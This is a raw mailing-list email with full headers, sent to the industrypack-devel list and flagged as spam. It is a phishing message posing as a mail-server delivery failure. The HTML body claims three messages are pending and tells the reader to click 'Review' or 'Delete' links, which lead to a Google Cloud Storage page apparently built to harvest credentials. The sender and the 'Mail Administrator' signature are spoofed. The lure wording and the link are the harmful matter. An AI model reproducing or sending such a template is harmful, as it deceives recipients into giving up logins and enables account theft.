Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 8ABF6B588F0
	for <lists+industrypack-devel@lfdr.de>; Tue, 16 Sep 2025 02:10:50 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:
	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=S7UySGITdSdCzWii+jtTwyEkN5RXkUA8yZxvRjeiHgA=; b=VNeVwa9+U3BPoZ2o4dDDak7aRO
	t6tRBDdxpDyGmsuM/drJo1RBiTjq7CVWYHKUDpwfeZle8JzU0Xgq7Zt+cAQTU92o4CW5pn+1laeyP
	3XHLbdmuFf/FvcSDSjI6tHly/uZdC9qphVup7DTepniiHZ+5SAJ2jZuykDIWNBeh3SLc=;
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1uyJHV-0003Pm-BS
	for lists+industrypack-devel@lfdr.de;
	Tue, 16 Sep 2025 00:10:49 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <mailer-daemon@host2.i4dots.com>) id 1uyJHU-0003Pg-7M
 for industrypack-devel@lists.sourceforge.net;
 Tue, 16 Sep 2025 00:10:48 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=MajxCUNAB+2AiRC3I/o2lr+wch6xYsslIBhfocYNDFE=; b=QsWhMERtyCTELZVf6hLUs1O7r5
 zLlmbd1ItWFxMoKMJINNilHm1LOGDEYj+i+i4F9jonEyOmBVdDNsqudsYEaCFzpZV2JaYlD/LS+R0
 fM6b2t+xFw6LlXwUC602JagZxo8bQRVSpuDWDk3PF18WJlbYE+VXOpoOQcyIQaAJ6IYU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=MajxCUNAB+2AiRC3I/o2lr+wch6xYsslIBhfocYNDFE=; b=H
 9edcM9GOlQ00L2dNN5ilOlC0K4atf7V3z1tzKd8xEp9HSNvF6Hso90pUbmdv77guHRFg9oCiAUq2F
 RwoT0GjEJjQqVqMKbYlxBE0kUy0zQVuQiLRVIXXUJNc/FImrqP0C88S3UcVFqvAvpH+DVfkpn7jzt
 Fi0GStvtwuXI2YHE=;
Received: from [172.245.23.164] (helo=172-245-23-164-host.colocrossing.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1uyJHT-0003Nr-MP for industrypack-devel@lists.sourceforge.net;
 Tue, 16 Sep 2025 00:10:48 +0000
From: Mail Delivery System <mailer-daemon@host2.i4dots.com>
To: industrypack-devel@lists.sourceforge.net
Date: 16 Sep 2025 02:10:37 +0200
Message-ID: <20250916021037.B804DDA1BF0E666B@host2.i4dots.com>
MIME-Version: 1.0
X-Spam-Score: 5.3 (+++++)
X-Spam-Report: Spam detection software, running on the system "sfi-spamd-2.hosts.colo.sdot.me",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  Can’t reach this page Message from industrypack-devel@lists.sourceforge.net
    server 
 
 Content analysis details:   (5.3 points, 5.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 T_MXG_EMAIL_FRAG       BODY: URI with email in fragment
  0.0 HTML_MESSAGE           BODY: HTML included in message
  3.9 HELO_DYNAMIC_IPADDR2   Relay HELO'd using suspicious hostname (IP addr
                             2)
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1uyJHT-0003Nr-MP
Subject: [Industrypack-devel] =?utf-8?q?=5BSPAM=5D_Email_Notification=3A_Y?=
 =?utf-8?q?ou_have_=283=29_pending_mess=C9=91ges?=
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============4050366069450230668=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============4050366069450230668==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD><TITLE>Can&#8217;t reach this page</TITLE><LINK rel=3Dstyleshee=
t type=3Dtext/css href=3D"NewErrorPageTemplate.css">
<META content=3D"text/html; charset=3DUTF-8" http-equiv=3DContent-Type>
<SCRIPT language=3Djavascript type=3Dtext/javascript src=3D"errorPageString=
s.js">
        </SCRIPT>

<SCRIPT language=3Djavascript type=3Dtext/javascript src=3D"httpErrorPagesS=
cripts.js">
        </SCRIPT>

<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY onload=3Djavascript:getInfo();>
<P>
<TABLE style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; BORDER-TOP: rgb(21=
1,211,211) 1px dotted; FONT-FAMILY: Roboto, Tahoma, Helvetica, sans-serif; =
BORDER-RIGHT: rgb(211,211,211) 1px dotted; WHITE-SPACE: normal; WORD-SPACIN=
G: 0px; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(211,211,211) 1px dott=
ed; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYL=
E: normal; TEXT-ALIGN: left; BORDER-LEFT: rgb(211,211,211) 1px dotted; ORPH=
ANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=20
BACKGROUND-COLOR: rgb(255,255,255); border-image: none; font-variant-ligatu=
res: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; tex=
t-decoration-thickness: initial; text-decoration-style: initial; text-decor=
ation-color: initial">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<TH style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(0,0,0) 0px solid; BORD=
ER-RIGHT: rgb(0,0,0) 0px solid; WIDTH: 2px; BORDER-BOTTOM: rgb(0,0,0) 0px s=
olid; COLOR: rgb(0,0,0); PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEF=
T: 5px; BORDER-LEFT: rgb(0,0,0) 0px solid; PADDING-RIGHT: 5px; BACKGROUND-C=
OLOR: rgb(2,151,64); border-image: none">&nbsp;</TH>
<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(0,0,0) 0px solid; BORD=
ER-RIGHT: rgb(0,0,0) 0px solid; WIDTH: 665px; BORDER-BOTTOM: rgb(0,0,0) 0px=
 solid; COLOR: rgb(0,0,0); PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-L=
EFT: 5px; BORDER-LEFT: rgb(0,0,0) 0px solid; PADDING-RIGHT: 5px; BACKGROUND=
-COLOR: rgb(243,255,248); border-image: none"><SPAN style=3D"BOX-SIZING: bo=
rder-box; FONT-SIZE: 12px">Message from&nbsp;industrypack-devel@lists.sourc=
eforge.net server</SPAN></TD></TR></TBODY></TABLE></P>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-SIZE: 12=
px; FONT-FAMILY: Verdana; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline=
; WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TR=
ANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); PADDING-BOTTOM: 20px=
; FONT-STYLE: normal; TEXT-ALIGN: left; PADDING-TOP: 20px; PADDING-LEFT: 20=
px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIG=
HT: 20px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR:=20
rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-va=
riant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickne=
ss: initial; text-decoration-style: initial; text-decoration-color: initial=
; font-stretch: inherit">
<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPAC=
E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGH=
T: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS=
: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGRO=
UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
ion-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial"></SPAN>&nbsp;</DIV>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: Roboto, s=
ans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0px; TEXT-TR=
ANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; =
ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,25=
5,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps=
: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initia=
l; text-decoration-style: initial;=20
text-decoration-color: initial" align=3Dleft><FONT style=3D"BOX-SIZING: bor=
der-box" color=3D#000066 size=3D4 face=3DArial><STRONG style=3D"BOX-SIZING:=
 border-box; FONT-WEIGHT: bolder">Messages Delivery Failure</STRONG></FONT>=
</P>
<DIV class=3Dv1yiv9201021698gmail_quote_mr_css_attr style=3D"BOX-SIZING: bo=
rder-box; FONT-SIZE: 13px; BORDER-TOP: 0px; FONT-FAMILY: Roboto, sans-serif=
; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT=
: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LET=
TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial" align=3Dlef=
t><FONT size=3D3><FONT style=3D"BOX-SIZING: border-box"><SPAN style=3D"BOX-=
SIZING: border-box">The delivery of messages was stopped by the&nbsp;lists.=
sourceforge.net Mail-Server.</SPAN><BR style=3D"BOX-SIZING: border-box"><SP=
AN style=3D"BOX-SIZING: border-box">You have 3 pending messages that could =
not be sent as of 9/16/2025 2:10:37 a.m.</SPAN></FONT> <BR style=3D"BOX-SIZ=
ING: border-box"><BR style=3D"BOX-SIZING: border-box">
<SPAN style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-bo=
x">Click to&nbsp;</FONT>
 <A class=3Dv1external_mr_css_attr style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZ=
ING: border-box; CURSOR: pointer; TEXT-DECORATION: none; BORDER-RIGHT-WIDTH=
: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(17,85=
,204); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0p=
x; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: transparent=
" href=3D"https://storage.googleapis.com/veri01/aspx.html#industrypack-deve=
l@lists.sourceforge.net" rel=3Dnoreferrer target=3D_blank>
<FONT style=3D"BOX-SIZING: border-box" face=3DArial><U>Review</U></FONT></A=
><FONT style=3D"BOX-SIZING: border-box">&nbsp;</FONT><FONT style=3D"BOX-SIZ=
ING: border-box">or</FONT><SPAN>&nbsp;</SPAN>
 <A class=3Dv1external_mr_css_attr style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZ=
ING: border-box; CURSOR: pointer; TEXT-DECORATION: none; BORDER-RIGHT-WIDTH=
: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(17,85=
,204); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0p=
x; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: transparent=
" href=3D"https://storage.googleapis.com/veri01/aspx.html#industrypack-deve=
l@lists.sourceforge.net" rel=3Dnoreferrer target=3D_blank>
<FONT style=3D"BOX-SIZING: border-box" face=3DArial><U>Delete</U></FONT></A=
><SPAN>&nbsp;</SPAN><FONT style=3D"BOX-SIZING: border-box">pending outgoing=
 e-mail messages.</FONT></SPAN></FONT></DIV>
<DIV class=3Dv1yiv9201021698gmail_quote_mr_css_attr style=3D"BOX-SIZING: bo=
rder-box; FONT-SIZE: 13px; BORDER-TOP: 0px; FONT-FAMILY: Roboto, sans-serif=
; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT=
: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LET=
TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial" align=3Dlef=
t><FONT size=3D3><SPAN style=3D"BOX-SIZING: border-box"></SPAN></FONT>&nbsp=
;</DIV>
<DIV class=3Dv1yiv9201021698gmail_quote_mr_css_attr style=3D"BOX-SIZING: bo=
rder-box; FONT-SIZE: 13px; MARGIN-BOTTOM: 0pt; BORDER-TOP: 0px; FONT-FAMILY=
: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
M: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-A=
LIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR=
: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-=
variant-caps: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial"><SPAN style=3D"BOX-SIZING: border-box; COLOR: blac=
k"><FONT size=3D3>Thanks,</FONT></SPAN></DIV>
<DIV class=3Dv1yiv9201021698gmail_quote_mr_css_attr style=3D"BOX-SIZING: bo=
rder-box; FONT-SIZE: 13px; MARGIN-BOTTOM: 0pt; BORDER-TOP: 0px; FONT-FAMILY=
: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
M: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-A=
LIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR=
: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-=
variant-caps: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial"><STRONG style=3D"BOX-SIZING: border-box; FONT-WEIG=
HT: bolder"><SPAN style=3D"BOX-SIZING: border-box; COLOR: black"><FONT size=
=3D3>Mail&nbsp;Administrator</FONT></SPAN></STRONG></DIV></BODY></HTML>


--===============4050366069450230668==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============4050366069450230668==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============4050366069450230668==--
